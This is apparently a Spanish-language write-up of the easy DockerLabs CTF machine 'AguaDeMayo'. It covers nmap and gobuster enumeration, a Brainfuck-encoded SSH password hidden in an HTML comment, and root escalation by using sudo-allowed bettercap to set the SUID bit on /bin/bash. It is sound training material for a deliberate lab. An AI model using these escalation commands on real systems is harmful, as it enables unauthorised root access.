---
title: "DockerLabs - AguaDeMayo"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina orientada a practicar enumeración web e intrusión, con escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh aguademayo.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — HTTP (Apache, página por defecto)

## Enumeración Web

Fuzzing de directorios:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Ruta encontrada: `/images` — contiene la imagen `agua_ssh.jpg`.

El nombre de la imagen revela el usuario SSH: **`agua`**.

### Código Brainfuck en el HTML

En el código fuente de la página principal (`Ctrl+U`) se encuentra un comentario oculto con código Brainfuck:

```
<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```

Decodificado con dcode.fr/brainfuck-language → **`bebeaguaqueessano`**

## Intrusión

```bash
ssh agua@172.17.0.2
# contraseña: bebeaguaqueessano
```

## Escalada de privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/bettercap
```

El usuario `agua` puede ejecutar `bettercap` como root sin contraseña.

Explotación mediante abuso de bettercap para activar SUID en bash:

```bash
# Abrir bettercap como root (comillas simples para evitar expansión de historial en bash)
sudo bettercap -eval '!bash'

# Dentro de bettercap, activar SUID en /bin/bash
!chmod u+s /bin/bash

# Salir de bettercap
exit

# Ejecutar bash con privilegios de root
bash -p
whoami
# root
```

## Conclusión

La máquina combina esteganografía social (nombre de imagen como pista de usuario) con ofuscación de contraseña mediante Brainfuck en el HTML. La escalada aprovecha bettercap en sudoers para activar el bit SUID en bash.

**Lecciones aprendidas:**
- Revisar siempre el código fuente HTML en busca de comentarios ocultos.
- Los lenguajes esotéricos (Brainfuck, etc.) son un recurso habitual para ocultar contraseñas en CTFs.
- Un binario con sudo NOPASSWD puede ser suficiente para escalar a root aunque no esté en GTFOBins — bettercap permite ejecutar comandos del sistema con `!`.
- Usar comillas simples al pasar argumentos con `!` en bash para evitar la expansión de historial.
